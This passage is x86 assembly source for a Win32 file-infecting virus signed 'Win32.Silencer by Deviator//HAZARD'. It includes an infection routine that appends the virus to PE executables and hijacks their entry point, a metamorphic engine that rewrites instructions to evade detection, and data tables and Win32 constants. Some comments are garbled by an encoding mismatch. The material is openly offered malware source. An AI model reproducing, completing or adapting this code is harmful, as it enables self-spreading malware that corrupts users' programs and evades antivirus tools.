       lea edx,[need][ebp]
       push    edx
       lea ecx,[free][ebp]
       Call    [ReadFile][ebp],ebx,edx,0F8h,ecx,0  ; -ð¢ÿ?¿
       pop edi
       mov eax,'EP'            ; PE ?
       scasd
       jnz CloseIt

       movzx   eax,2 ptr [need][ebp][6]
       dec eax
       mov edx,28h
       xor ecx,ecx
       mul edx
       Call    [FSeek][ebp],ebx,eax,0,1
       mov [fsec][ebp],eax         ; ?R¡<?ý-¯¯ ¡?ò¦ð¯

       lea edx,[sects][ebp]
       lea ecx,[free][ebp]
       Call    [ReadFile][ebp],ebx,edx,28h,ecx,0

       or  4 ptr [sects][ebp][24h],0C0000000h  ; Read+Write

       mov eax,4 ptr [sects][ebp][10h]
       add eax,4 ptr [sects][ebp][14h]
       Call    [FSeek][ebp],ebx,eax,0,0        ; ÷ òR-?¦ ¡?ò¦ðð

       mov eax,4 ptr [need][ebp][28h]
       add eax,4 ptr [need][ebp][34h]
       mov 4 ptr [OldHost][ebp],eax

       mov eax,4 ptr [sects][ebp][0Ch]
       add eax,4 ptr [sects][ebp][10h]
       mov 4 ptr [need][ebp][28h],eax

       push    ebx
       lea esi,[VTbl][ebp]
       mov ebx,offset VEntry
       mov ecx,offset FLen
       mov eax,offset VEntry
       sub ecx,eax
       lea edx,[VEntry][ebp]
       lea eax,[VLen][ebp]

       mov edi,edx         ; ð¢ «? ¿ÿ-ðô£<¯¦ðð ¡ ÿýý ?¡R¿
       add edi,ecx         ; ô? ?¿?--Rc ÿ ô ?ý?<R¿ ÷ð £¡ÿ
       add edi,2
       push    edi

       Call    DME
       pop edi
       pop ebx

       sub eax,edi

       mov [cVirFullLen][ebp],ecx
       mov [cVirLen][ebp],eax

       mov eax,[cVirFullLen][ebp]
       shl eax,2
       add 4 ptr [sects][ebp][8],eax

       add 4 ptr [need][ebp][1Ch],eax
       add 4 ptr [need][ebp][50h],eax

       mov eax,[cVirLen][ebp]
       mov ecx,4 ptr [need][ebp][38h]
       xor edx,edx
       div ecx
       sub ecx,edx
       push    ecx ecx
       add ecx,[cVirLen][ebp]
       add 4 ptr [sects][ebp][10h],ecx

       push    edi
       lea edx,[free][ebp]
       Call    [WriteFile][ebp],ebx,edi,[cVirLen][ebp],edx,0
       pop edi
       pop ecx
       push    edi
       xor eax,eax
   rep stosb
       pop edi ecx
       lea edx,[free][ebp]
       Call    [WriteFile][ebp],ebx,edi,ecx,edx,0

       Call    [FSeek][ebp],ebx,[fsec][ebp],0,0
       lea eax,[sects][ebp]
       lea edx,[free][ebp]
       Call    [WriteFile][ebp],ebx,eax,28h,edx,0

       Call    [FSeek][ebp],ebx,[peh][ebp],0,0
       lea eax,[need][ebp]
       lea edx,[free][ebp]
       Call    [WriteFile][ebp],ebx,eax,0F8h,edx,0

       Call    [FSeek][ebp],ebx,12h,0,0
       lea eax,[dm][ebp]       ; ?ö<R¿-R ö«<R §¢R-¢R ô ðý£¿«÷ÿ¢¬
       lea edx,[free][ebp]
       Call    [WriteFile][ebp],ebx,eax,2,edx,0
   CloseIt:
       Call    [CloseHandle][ebp],ebx
   nextone:
           ret
   InfectFile      endp

   cVirLen dd  0
   fsec    dd  0
   peh dd  0
   cVirFullLen dd  0

   dm  db  'DH'

       db  'Win32.Silencer by Deviator//HAZARD'

   --[ Jumps.inc ]---------------------------------------------------------------

   ; ? R¦?ý£ « ý<¯ -ÿ¡¢ Rcòð Jump'R÷ ð ¢R?R ôRýRö-R?R
   ; Different jmp/call/etc procedures

   MaxJumps    equ 1000

   AddJump proc
       push    esi edi
       mov ebx,esi

       lodsb
       cmp al,0E9h
       jz  NearJ
       cmp al,0E8h
       jz  NearJ
       cmp al,0EBh
       jz  sJump

       cmp al,0Fh
       jz  TryXJ

       cmp al,0E0h
       jb  d1
       cmp al,0E2h
       jbe sJump

   d1: cmp al,70h
       jb  NotJump
       cmp al,7Fh
       ja  NotJump

   sJump:  xor eax,eax
       lodsb
       cbw
       or  ax,ax
       jge NoInv
       or  eax,0FFFF0000h
   NoInv:  Call    AddJmp
       jmp NotJump
   NearJ:  lodsd
       Call    AddJmp
   NotJump:pop edi esi
       ret

   TryXJ:  lodsb
       cmp al,80h
       jb  NotJump
       cmp al,8Fh
       ja  NotJump
       jmp NearJ
   AddJump endp

   AddJmp  proc
       mov edi,[Jmpn][ebp]
       lea edi,[Jumps][ebp][edi*8]
       xchg    eax,ebx
       stosd
       xchg    eax,ebx
       add eax,esi
       stosd
       inc [Jmpn][ebp]
       ret
   AddJmp  endp

   ;--------------------------------------------------------------------
   GetJmpAddr  proc
       push    esi
       lea esi,[Jumps][ebp]
       mov ecx,[Jmpn][ebp]
       or  ecx,ecx
       jz  NoJmpx
   FindJJ: cmp [esi],eax
       jz  ItHere
       add esi,8
       loop    FindJJ
   NoJmpx: xor eax,eax
       pop esi
       ret
   ItHere: mov eax,esi
       pop esi
       ret
   GetJmpAddr  endp
   ;--------------------------------------------------------------------
   CheckAddr   proc        ; ESi - Addr
       mov ecx,[Jmpn][ebp]
       or  ecx,ecx
       jz  NoJmp
       lea ebx,[Jumps][ebp]
   CheckAr:
       cmp [ebx],esi
       jnz NotPos
       mov [ebx],edi
   NotPos: cmp [ebx][4],esi
       jnz NoPoint
       mov [ebx][4],edi
   NoPoint:
       add ebx,8
       loop    CheckAr
   NoJmp:  ret
   CheckAddr   endp

   ;--------------------------------------------------------------------
   PatchJumps  proc
       mov ecx,[Jmpn][ebp]
       or  ecx,ecx
       jz  NoJmp
       lea esi,[Jumps][ebp]
   DoPatch:
       lodsd
       or  eax,eax
       jz  Skip1
       mov ebx,eax
       mov al,[ebx]
       cmp al,0E8h
       jz  NearJmp
       cmp al,0E9h
       jz  NearJmp
       cmp al,0Fh
       jz  xNearJmp
   ;; Short Jmp
       lodsd
       sub eax,ebx
       sub eax,2
       mov [ebx][1],al
       jmp NextLoop
   xNearJmp:
       lodsd
       sub eax,ebx
       sub eax,6
       mov [ebx][2],eax
       jmp NextLoop
   NearJmp:
       lodsd
       sub eax,ebx
       sub eax,5
       mov [ebx][1],eax
       jmp NextLoop
   Skip1:  lodsd
   NextLoop:
       loop    DoPatch
       ret
   PatchJumps  endp

   --[ Morph.inc ]----------------------------------------------------------------

   ; 'Rö¡¢÷?--R ¡ÿ¿ÿ ô R¦?ý£ ÿ-¿R ¤? 
   ; Morpher

   Morph   proc    ; ESi - SRC, EDi - DST, Returns: ECX - new size
       push    edi
   xMorph: cmp esi,[MaxMorph][ebp]         ; "R òR-¦ÿ ýR¨<ð ?
       ja  AllDone                 ; Some data more ?

       Call    CheckBlock              ; Code ?
       jc  SkipByte

       Call    DoGarble

       Call    CheckVariable
       Call    CheckAddr
       Call    CheckDataAddr
       Call    CheckTblAddr

       Call    GetSize32           ; ?Rý. ?ÿ¿?  òR¿¿ÿ-ý«

       push    eax
       Call    Mutate              ; Permutate instruction
       pop ecx             ; (if possible)
       jnc     AddGarb             ; Permutated ?
   rep movsb                   ; Just copy
   AddGarb:
   ;   Call    DoGarble
       mov [GarbLvl][ebp],0
       jmp xMorph
   SkipByte:
       Call    CheckVariable
       Call    CheckAddr
       Call    CheckDataAddr
       Call    CheckTblAddr
       movsb                   ; "ÿ--«?. ?Rôð £?¿ öÿc¢
                           ; Data. Copy byte
       jmp xMorph
   AllDone:
       pop eax
       sub edi,eax             ; ?ÿ¡¡§ð¢ÿ?¿ -R÷«c  ÿ¿? 
       xchg    edi,ecx
       ret
   Morph   endp

   --[ Mutate.inc ] -------------------------------------------------------------

   ; Simple instruction permutator

   Mutate  proc
       push    edx ebx
       mov ebx,edi
       lea edi,[MutTbl][ebp]
   Findt:  mov al,[esi]
       movzx   ecx,1 ptr [edi]
       or  ecx,ecx
       jz  mBadOpcode
       inc edi
   repne   scasb
       jnz mSkipBlock
       add edi,ecx
       mov eax,[edi]
       add eax,ebp

       push    edi
       mov edi,ebx
       Call    eax
       pop edx
       jc  xNoMorph
       pop ebx edx
       ret
   xNoMorph:
       mov edi,edx
   mSkipBlock:
       add edi,4
       jmp Findt
   mBadOpcode:
       mov edi,ebx
       pop ebx edx
       stc
       ret
   Mutate  endp
   ;--------------------------------------------------------
   Mut_ShortJmp:
       mov al,0Fh
       stosb
       lodsb
       add al,10h
       stosb

       lodsb
       cbw
       or  ax,ax
       jge NotL
       or  eax,0FFFF0000h
   NotL:   add eax,1
       stosd
           clc
           ret
   ;--------------------------------------------------------

   Mut_ShortJmp2:
       mov al,0E9h
       stosb
       lodsb
       lodsb
       cbw
       or  ax,ax
       jge NotL1
       or  eax,0FFFF0000h
   NotL1:  add eax,1
       stosd
           clc
       ret
   ;--------------------------------------------------------

   Mut_Loop:
       mov eax,edi
       Call    GetJmpAddr
       inc 4 ptr [eax]

           mov     al,49h          ; dec ecx
           stosb
       mov al,0Fh          ; jnz ...
       stosb
           mov     al,85h
       stosb

       lodsb
       lodsb
       cbw
       or  ax,ax
       jge NotL3
       or  eax,0FFFF0000h
   NotL3:  stosd
           clc
           ret
   ;---------------------------------------------------------------------
   Mut_CheckZero:
       Call    TryMutate
       jnz NotRegReg

       mov al,[esi][1]
       cmp al,0C0h
       jb  NotRegReg
       push    eax
       and al,00111000b
       shr al,3
       mov cl,al
       pop eax
       and al,111b
       cmp cl,al
       jnz NotRegReg
       Call    EncodeFreeReg
       add esi,2
       clc
       ret
   NotRegReg:
       stc
       ret
   ;---------------------------------------------------------------------
   TryMutate   proc
       push    eax
       mov eax,3
       Call    Random
       or  eax,eax
       pop eax
       ret
   TryMutate   endp
   ;---------------------------------------------------------------------
   Mut_MovZero:
       Call    TryMutate
       jnz NotRegReg

       mov eax,[esi][1]
       or  eax,eax
       jnz NotRegReg
       mov al,[esi]
       sub al,0B8h
       Call    EncodeFreeReg
       add esi,5
       clc
       ret
   ;=============
   EncodeFreeReg   proc
       push    eax
       mov eax,5
       Call    Random
       or  eax,eax
       jz  EncodeMovZero
       dec eax
       mov al,[ZeroTbl][ebp][eax]
       stosb
       pop eax
       mov cl,al
       shl al,3
       add al,cl
       add al,0C0h
       stosb
       ret
   EncodeMovZero:
       pop eax
       add al,0B8h
       stosb
       xor eax,eax
       stosd
       ret
   EncodeFreeReg   endp
   ;---------------------------------------------------------------------
   Mut_Xchg:
       Call    TryMutate
       jnz NoxMut

       lodsb
       sub al,90h
       push    eax
       add al,50h
       stosb
       mov al,50h
       stosb
       pop eax
       add al,58h
       stosb
       mov al,58h
       stosb
       clc
       ret
   NoxMut:
       stc
       ret
   ;---------------------------------------------------------------------
   Mut_Inc:
       Call    TryMutate
       jnz NoxMut
       lodsb
       sub al,40h
       Call    EncodeInc
       ret
   ;=============
   EncodeInc   proc
       xchg    eax,ebx
       mov eax,3
       Call    Random
       dec eax
       jz  GenAdd
       dec eax
       jz  GenSub
       mov al,40h
       add al,bl
       stosb
       clc
       ret
   GenAdd: mov al,83h
       stosb
       mov al,bl
       add al,0C0h
       stosb
       mov al,1
       stosb
       clc
       ret
   GenSub: mov al,83h
       stosb
       mov al,bl
       add al,0E8h
       stosb
       mov al,-1
       stosb
       ret
   EncodeInc   endp
   ;---------------------------------------------------------------------
   Mut_Dec:
       Call    TryMutate
       jnz NoxMut
       lodsb
       sub al,48h
       Call    EncodeDec
       clc
       ret
   ;=============
   EncodeDec   proc
       xchg    eax,ebx
       mov eax,3
       Call    Random
       dec eax
       jz  DecAdd
       dec eax
       jz  DecSub
       mov al,48h
       add al,bl
       stosb
       clc
       ret
   DecAdd: mov al,83h
       stosb
       mov al,bl
       add al,0C0h
       stosb
       mov al,-1
       stosb
       clc
       ret
   DecSub: mov al,83h
       stosb
       mov al,bl
       add al,0E8h
       stosb
       mov al,1
       stosb
       ret
   EncodeDec   endp
   ;---------------------------------------------------------------------
   TryIncDec   proc
       mov al,[esi][1]
       cmp al,0C0h
       jb  NoxMut
       and al,11111000b
       cmp al,0C0h
       jz  CheckAdd
       cmp al,0E8h
       jnz NoxMut
       mov al,[esi][2]
       cmp al,1
       jz  EnDec
       cmp al,-1
       jnz NoxMut
       mov al,[esi][1]
       sub al,0E8h
       add esi,3
       Call    EncodeInc
       clc
       ret
   EnDec:  mov al,[esi][1]
       sub al,0E8h
       add esi,3
       Call    EncodeDec
       clc
       ret
   ;==
   CheckAdd:
       mov al,[esi][2]
       cmp al,-1
       jz  EnxDec
       cmp al,1
       jnz NoxMut
       mov al,[esi][1]
       sub al,0C0h
       add esi,3
       Call    EncodeInc
       clc
       ret
   EnxDec: mov al,[esi][1]
       sub al,0C0h
       add esi,3
       Call    EncodeDec
       clc
       ret
   TryIncDec   endp
   ;---------------------------------------------------------------------

   MutTbl  db  1
       db  0EBh
       dd  offset Mut_ShortJmp2

       db  16
       db  70h,71h,72h,73h,74h,75h,76h,77h
       db  78h,79h,7Ah,7Bh,7Ch,7Dh,7Eh,7Fh
       dd  offset Mut_ShortJmp

       db  3
       db  0E0h,0E1h,0E2h
       dd  offset Mut_Loop

       db  4
   ZeroTbl db  31h,33h,29h,2Bh
       dd  offset Mut_CheckZero

       db  8
       db  0B8h,0B9h,0BAh,0BBh,0BCh,0BDh,0BEh,0BFh
       dd  offset Mut_MovZero

       db  7
       db  91h,92h,93h,94h,95h,96h,97h
       dd  offset Mut_Xchg

       db  8
       db  40h,41h,42h,43h,44h,45h,46h,47h
       dd  offset Mut_Inc

       db  8
       db  48h,49h,4Ah,4Bh,4Ch,4Dh,4Eh,4Fh
       dd  offset Mut_Dec

       db  1
       db  83h
       dd  offset TryIncDec

       db  0

   --[ Pdata.inc ]---------------------------------------------------------------

   ; Different procedures to work with data

   MaxData equ 700

   AddData proc
       push    esi edi
       Call    CheckDataOpcode
       jc  NotData
       Call    AddDta
   NotData:pop edi esi
       ret
   AddData endp

   AddDta  proc
       mov edi,[Datan][ebp]
       lea edi,[Datas][ebp][edi*8]
       mov eax,esi
       stosd
       Call    GetDataAddr
       cmp eax,[xSrc][ebp]
       jb  NotOur
       cmp eax,[MaxMorph][ebp]
       ja  NotOur
       stosd
       inc [Datan][ebp]
   NotOur: ret
   AddDta  endp
   ;--------------------------------------------------------------------
   CheckDataAddr   proc        ; ESi - Addr
       mov ecx,[Datan][ebp]
       or  ecx,ecx
       jz  NData
       lea ebx,[Datas][ebp]
   CheckData:
       cmp [ebx],esi
       jnz NxData
       mov [ebx],edi
   NxData: cmp [ebx][4],esi
       jnz NPoint
       mov [ebx][4],edi
   NPoint:
       add ebx,8
       loop    CheckData
   NData:  ret
   CheckDataAddr   endp
   ;--------------------------------------------------------------------
   PatchData   proc
       mov ecx,[Datan][ebp]
       or  ecx,ecx
       jz  NoJmp
       lea esi,[Datas][ebp]
   DataPatch:
       lodsd
       push    esi
       push    eax
       xchg    eax,esi
       Call    PointData
       pop ebx
       add ebx,eax
       pop esi
       lodsd

   ;   sub eax,[xDst][ebp]

       mov [ebx],eax
       loop    DataPatch
       ret
   PatchData   endp
   ;--------------------------------------------------------------------
   CheckDataOpcode proc
       Call    PointData
       or  eax,eax
       jz  BadR
       clc
       ret
   BadR:   stc
       ret
   CheckDataOpcode endp

   GetDataAddr proc
       Call    PointData
       add eax,esi
       mov eax,[eax]
       sub eax,[xBase][ebp]
       add eax,[xSrc][ebp]
       ret
   GetDataAddr endp
   ;--------------------------------------------------------------------
   PointData   proc
       push    esi edi ecx
       mov ebx,esi
       lodsb
       lea edi,[DataTbl][ebp]
   FindData:
       movzx   ecx,1 ptr [edi]
       or  ecx,ecx
       jz  NotDataOpcode
       inc edi
   repne   scasb
       jnz SkipThatBlock
       add edi,ecx
       mov eax,[edi]
       add eax,ebp
       Call    eax
       pop ecx edi esi
       mov eax,ebx
       sub eax,esi
       ret
   SkipThatBlock:
       add edi,4
       jmp FindData
   NotDataOpcode:
       pop ecx edi esi
       xor eax,eax
       ret
   PointData   endp

   DataComplex proc
       xor edx,edx
       lodsb
       push    eax
       and al,00000111b
       cmp al,4
       pop eax
       jnz xHaveData
       inc edx
   xHaveData:
       push    eax
       shr al,6
       cmp al,2
       pop eax
       jz  HaveData

       and al,11000111b
       cmp al,5
       jz  HaveData

       or  edx,edx
       jz  NoData
       lodsb
       and al,111b
       cmp al,5
       jz  RetData

   NoData: ret
   HaveData:
       or  edx,edx
       jz  RetData
       inc esi
   RetData:
       mov ebx,esi
       ret
   ExtendedData:
   DataComplex endp

   DataReturn1:
       inc ebx
       ret

   xOpcode:
       lodsb
       cmp al,0A3h
       jz  DataComplex
       cmp al,0A4h
       jz  DataComplex
       cmp al,0A5h
       jz  DataComplex
       cmp al,0ABh
       jz  DataComplex
       cmp al,0ACh
       jz  DataComplex
       cmp al,0ADh
       jz  DataComplex
       cmp al,0AFh
       jz  DataComplex

       cmp al,3
       ja  dS1
       cmp al,0
       jae DataComplex

   dS1:    cmp al,26h
       ja  dS2
       cmp al,20h
       jae DataComplex

   dS2:    cmp al,4Fh
       ja  dS3
       cmp al,40h
       jae DataComplex

   dS3:    cmp al,9Ah
       ja  DataComplex
       cmp al,90h
       jae DataComplex

           jmp     DataComplex

   ;----------------------------------------------------------------------
   CheckVariable   proc
       mov eax,[xAddOffset][ebp]
       cmp eax,esi
       jnz NotIt
       mov [xAddOffset][ebp],edi
   NotIt:  ret
   CheckVariable   endp
   ;----------------------------------------------------------------------
   DataTbl db  32
       db  00h,02h,10h,12h,20h,22h,30h,32h ; ADD,ADC,AND,XOR
       db  01h,03h,11h,13h,21h,23h,31h,33h ; OR ,SBB,SUB,CMP
       db  08h,0Ah,18h,1Ah,28h,2Ah,38h,3Ah
       db  09h,0Bh,19h,1Bh,29h,2Bh,39h,3Bh
       dd  offset DataComplex

           db  6
       db  0A0h,0A1h,0A2h,0A3h,0A8h,0A9h   ; MOV (E)AX,mem16(32)
       dd  offset DataReturn1

           db  2
       db  0C4h,0C5h           ; LES/LDS
       dd  offset DataComplex

           db  1
       db  0C6h                ; MOV mem,im8
       dd  offset DataComplex

           db  1
       db  0C7h                ; MOV mem,imm16(32)
       dd  offset DataComplex

           db  2
       db  0C0h,0C1h           ; SHL/ROL/ROR ...,im8
       dd  offset DataComplex

       db  4
       db  0D0h,0D1h,0D2h,0D3h     ; SHL/.... ,1
       dd  offset DataComplex      ; SHL/.... ,CL

       db  4
       db  88h,89h,8Ah,8Bh         ; MOV r/m,im16,etc
       dd  offset DataComplex

           db  2
       db  8Ch,8Eh             ; MOV r/m,seg
       dd  offset DataComplex      ; MOV seg,r/m

           db  2
       db  8Fh,8Dh             ; POP r/m,LEA reg,r/m
       dd  offset DataComplex

       db  1
       db  69h             ; imul r/m,im16(32)
       dd  offset DataComplex

       db  1
       db  6Bh             ; imul r/m,im8
       dd  offset DataComplex

       db  4
       db  84h,85h,86h,87h         ; TEST/XCHG r8(16)(32),r/m
       dd  offset DataComplex

       db  2
       db  80h,81h             ; ArOp r/m,r16(32)
       dd  offset DataComplex

       db  2
       db  0FEh,0FFh
       dd  offset DataComplex

       db  8
       db  0B8h,0B9h,0BAh,0BBh,0BCh,0BDh,0BEh,0BFh
       dd  offset DataReturn1

       db  1
       db  0Fh
       dd  offset xOpcode

           db      0

   --[ Tables.inc ]---------------------------------------------------------------

   ; Procedures needed to permutate opcode tables(and/or jump tables)

   MaxTbls equ 300

   TravelOpTable   proc
       xor eax,eax
       lodsb
       or  eax,eax
       jz  Traveled
       add esi,eax

       mov eax,esi
       stosd
       lodsd
       add eax,ebp
       stosd
       inc [Tbln][ebp]
       jmp TravelOpTable
   Traveled:
       ret
   TravelOpTable   endp

   TravelJmpTable  proc
       mov eax,esi
       stosd
       lodsd
       add eax,ebp
       stosd
       inc [Tbln][ebp]
       loop    TravelJmpTable
       ret
   TravelJmpTable  endp

   CheckTblAddr    proc        ; ESi - Addr
       mov ecx,[Tbln][ebp]
       or  ecx,ecx
       jz  TData
       lea ebx,[Tbls][ebp]
   TCheckData:
       cmp [ebx],esi
       jnz TxPoint
       mov [ebx],edi
   TxPoint:
       cmp [ebx][4],esi
       jnz TPoint
       mov [ebx][4],edi
   TPoint: add ebx,8
       loop    TCheckData
   TData:  ret
   CheckTblAddr    endp

   PatchTblData    proc
       mov ecx,[Tbln][ebp]
       or  ecx,ecx
       jz  NoJmp
       lea esi,[Tbls][ebp]
   DataTblPatch:
       lodsd
       xchg    eax,ebx
       lodsd

   ;   sub eax,[xDst][ebp]

       mov [ebx],eax
       loop    DataTblPatch

       ret
   PatchTblData    endp

   --[ user.inc ]----------------------------------------------------------------

   ; User procedures. Currently just one procedure, that initialises table
   ; permutation.

   UserProc_InitTables proc
       push    esi
       lea edi,[Tbls][ebp]

       lea esi,[VTbl][ebp]
       mov ecx,VTbll
       Call    TravelJmpTable

       lea esi,[GarbTbl][ebp]
       mov ecx,GarbLen
       Call    TravelJmpTable

       lea esi,[OpTbl][ebp]
       Call    TravelOpTable
       lea esi,[DataTbl][ebp]
       Call    TravelOpTable
       lea esi,[MutTbl][ebp]
       Call    TravelOpTable
       pop esi
       ret
   UserProc_InitTables endp

   --[ Virdata.inc ]-------------------------------------------------------------

   CreateFile      dd  0
   ReadFile        dd  ?
   WriteFile       dd  ?
   CloseHandle     dd  ?
   FindFirstFile       dd  ?
   FindNextFile        dd  ?
   FindClose       dd  ?
   FSeek           dd  ?
   CreateThread        dd  ?
   ExitThread      dd  ?
   imnum   equ ($ - CreateFile) shr 2  ; ?R<ð§?¡¢÷R ð¿ôR ¢ð £?¿«¥ ¤£-ò¦ðc

   VirFindData         label
   dwFileAttributes    dd ?
   ftCreationTime      dq ?
   ftLastAccessTime    dq ?
   ftLastWriteTime     dq ?
   nFileSizeHigh       dd ?
   nFileSizeLow        dd ?
   dwReserved0     dd ?
   dwReserved1     dd ?
   cFileName       db MAX_PATH dup (?)
   cAlternateFileName  db 14 dup (0)

   sects       db  2Ch dup (0);
   free        dd  0
   need        db  400h dup (0);

   --[ win32.inc ]---------------------------------------------------------------

   UCHAR   EQU <db>
   USHORT  EQU <dw>  ; used only if we really need 16 bits
   UINT    EQU <dd>  ; 32 bits for WIN32
   ULONG   EQU <dd>

   ;*******************************************************************
   ;
   ;       Rectangle
   ;
   ;*******************************************************************

   RECT    struc
           rcLeft          UINT ?
           rcTop           UINT ?
           rcRight         UINT ?
           rcBottom        UINT ?
   RECT    ends

   ;*******************************************************************
   ;
   ;  Window Class structure
   ;
   ;*******************************************************************

   WNDCLASS struc
           clsStyle          UINT     ?   ; class style
           clsLpfnWndProc    ULONG    ?
           clsCbClsExtra     UINT     ?
           clsCbWndExtra     UINT     ?
           clsHInstance      UINT     ?   ; instance handle
           clsHIcon          UINT     ?   ; class icon handle
           clsHCursor        UINT     ?   ; class cursor handle
           clsHbrBackground  UINT     ?   ; class background brush
           clsLpszMenuName   ULONG    ?   ; menu name
           clsLpszClassName  ULONG    ?   ; far ptr to class name
   WNDCLASS ends

   PAINTSTRUCT STRUC
       PShdc         UINT             ?
       PSfErase      UINT             ?
       PSrcPaint     UCHAR            size RECT dup(?)
       PSfRestore    UINT             ?
       PSfIncUpdate  UINT             ?
       PSrgbReserved UCHAR            16 dup(?)
   PAINTSTRUCT ENDS

   MSGSTRUCT struc
       msHWND          UINT    ?
       msMESSAGE       UINT    ?
       msWPARAM        UINT    ?
       msLPARAM        ULONG   ?
       msTIME          ULONG   ?
       msPT            ULONG   ?
   MSGSTRUCT ends

   MINMAXINFO struc
     res_x               dd ?
     res_y               dd ?
     maxsize_x           dd ?
     maxsize_y           dd ?
     maxposition_x       dd ?
     maxposition_y       dd ?
     mintrackposition_x  dd ?
     mintrackposition_y  dd ?
     maxtrackposition_x  dd ?
     maxtrackposition_y  dd ?
   MINMAXINFO ends


   ;
   ;  Stock Logical Objects
   ;
   WHITE_BRUSH         =  0
   LTGRAY_BRUSH        =  1
   GRAY_BRUSH          =  2
   DKGRAY_BRUSH        =  3
   BLACK_BRUSH         =  4
   NULL_BRUSH          =  5
   HOLLOW_BRUSH        =  5
   WHITE_PEN           =  6
   BLACK_PEN           =  7
   NULL_PEN            =  8
   DOT_MARKER          =  9
   OEM_FIXED_FONT      = 10
   ANSI_FIXED_FONT     = 11
   ANSI_VAR_FONT       = 12
   SYSTEM_FONT         = 13
   DEVICE_DEFAULT_FONT = 14
   DEFAULT_PALETTE     = 15
   SYSTEM_FIXED_FONT   = 16

   ;
   ; Brush Styles
   ;
   BS_SOLID        =   0
   BS_NULL         =   1
   BS_HOLLOW       =   BS_NULL
   BS_HATCHED      =   2
   BS_PATTERN      =   3
   BS_INDEXED      =   4
   BS_DIBPATTERN   =   5
   ;
   ; Hatch Styles
   ;
   HS_HORIZONTAL   =   0       ; -----
   HS_VERTICAL     =   1       ; |||||
   HS_FDIAGONAL    =   2       ; \\\\\
   HS_BDIAGONAL    =   3       ; /////
   HS_CROSS        =   4       ; +++++
   HS_DIAGCROSS    =   5       ; xxxxx
   ;
   ; Pen Styles
   ;
   PS_SOLID        =   0
   PS_DASH         =   1       ; -------
   PS_DOT          =   2       ; .......
   PS_DASHDOT      =   3       ; _._._._
   PS_DASHDOTDOT   =   4       ; _.._.._
   PS_NULL         =   5
   PS_INSIDEFRAME  =   6

   ;
   ;  Window State Messages
   ;
   IFNDEF  NOWM
   WM_STATE            = 0000H

   WM_NULL             = 0000h
   WM_CREATE           = 0001h
   WM_DESTROY          = 0002h
   WM_MOVE             = 0003h
   WM_SIZE             = 0005h
   WM_ACTIVATE         = 0006h
   WM_SETFOCUS         = 0007h
   WM_KILLFOCUS        = 0008h
   WM_ENABLE           = 000Ah
   WM_SETREDRAW        = 000Bh
   WM_SETTEXT          = 000Ch
   WM_GETTEXT          = 000Dh
   WM_GETTEXTLENGTH    = 000Eh
   WM_PAINT            = 000Fh
   WM_CLOSE            = 0010h
   WM_QUERYENDSESSION  = 0011h
   WM_QUIT             = 0012h
   WM_QUERYOPEN        = 0013h
   WM_ERASEBKGND       = 0014h
   WM_SYSCOLORCHANGE   = 0015h
   WM_ENDSESSION       = 0016h
   WM_SYSTEMERROR      = 0017h
   WM_SHOWWINDOW       = 0018h
   WM_CTLCOLOR         = 0019h
   WM_WININICHANGE     = 001Ah
   WM_DEVMODECHANGE    = 001Bh
   WM_ACTIVATEAPP      = 001Ch
   WM_FONTCHANGE       = 001Dh
   WM_TIMECHANGE       = 001Eh
   WM_CANCELMODE       = 001Fh
   WM_SETCURSOR        = 0020h
   WM_MOUSEACTIVATE    = 0021h
   WM_CHILDACTIVATE    = 0022h
   WM_QUEUESYNC        = 0023h
   WM_GETMINMAXINFO    = 0024h
   WM_PAINTICON        = 0026h
   WM_ICONERASEBKGND   = 0027h
   WM_NEXTDLGCTL       = 0028h
   WM_SPOOLERSTATUS    = 002Ah
   WM_DRAWITEM         = 002Bh
   WM_MEASUREITEM      = 002Ch
   WM_DELETEITEM       = 002Dh
   WM_VKEYTOITEM       = 002Eh
   WM_CHARTOITEM       = 002Fh
   WM_SETFONT          = 0030h
   WM_GETFONT          = 0031h
   WM_QUERYDRAGICON    = 0037h
   WM_COMPAREITEM      = 0039h
   WM_COMPACTING       = 0041h
   WM_COMMNOTIFY       = 0044h
   WM_WINDOWPOSCHANGING= 0046h
   WM_WINDOWPOSCHANGED = 0047h
   WM_POWER            = 0048h

   WM_NCCREATE         = 0081h
   WM_NCDESTROY        = 0082h
   WM_NCCALCSIZE       = 0083h
   WM_NCHITTEST        = 0084h
   WM_NCPAINT          = 0085h
   WM_NCACTIVATE       = 0086h
   WM_GETDLGCODE       = 0087h
   WM_NCMOUSEMOVE      = 00A0h
   WM_NCLBUTTONDOWN    = 00A1h
   WM_NCLBUTTONUP      = 00A2h
   WM_NCLBUTTONDBLCLK  = 00A3h
   WM_NCRBUTTONDOWN    = 00A4h
   WM_NCRBUTTONUP      = 00A5h
   WM_NCRBUTTONDBLCLK  = 00A6h
   WM_NCMBUTTONDOWN    = 00A7h
   WM_NCMBUTTONUP      = 00A8h
   WM_NCMBUTTONDBLCLK  = 00A9h

   WM_KEYFIRST         = 0100h
   WM_KEYDOWN          = 0100h
   WM_KEYUP            = 0101h
   WM_CHAR             = 0102h
   WM_DEADCHAR         = 0103h
   WM_SYSKEYDOWN       = 0104h
   WM_SYSKEYUP         = 0105h
   WM_SYSCHAR          = 0106h
   WM_SYSDEADCHAR      = 0107h
   WM_KEYLAST          = 0108h

   WM_INITDIALOG       = 0110h
   WM_COMMAND          = 0111h
   WM_SYSCOMMAND       = 0112h
   WM_TIMER            = 0113h
   WM_HSCROLL          = 0114h
   WM_VSCROLL          = 0115h
   WM_INITMENU         = 0116h
   WM_INITMENUPOPUP    = 0117h
   WM_MENUSELECT       = 011Fh
   WM_MENUCHAR         = 0120h
   WM_ENTERIDLE        = 0121h


   WM_MOUSEFIRST       = 0200h
   WM_MOUSEMOVE        = 0200h
   WM_LBUTTONDOWN      = 0201h
   WM_LBUTTONUP        = 0202h
   WM_LBUTTONDBLCLK    = 0203h
   WM_RBUTTONDOWN      = 0204h
   WM_RBUTTONUP        = 0205h
   WM_RBUTTONDBLCLK    = 0206h
   WM_MBUTTONDOWN      = 0207h
   WM_MBUTTONUP        = 0208h
   WM_MBUTTONDBLCLK    = 0209h
   WM_MOUSELAST        = 0209h

   WM_PARENTNOTIFY     = 0210h
   WM_MDICREATE        = 0220h
   WM_MDIDESTROY       = 0221h
   WM_MDIACTIVATE      = 0222h
   WM_MDIRESTORE       = 0223h
   WM_MDINEXT          = 0224h
   WM_MDIMAXIMIZE      = 0225h
   WM_MDITILE          = 0226h
   WM_MDICASCADE       = 0227h
   WM_MDIICONARRANGE   = 0228h
   WM_MDIGETACTIVE     = 0229h
   WM_MDISETMENU       = 0230h
   WM_DROPFILES        = 0233h


   WM_CUT              = 0300h
   WM_COPY             = 0301h
   WM_PASTE            = 0302h
   WM_CLEAR            = 0303h
   WM_UNDO             = 0304h
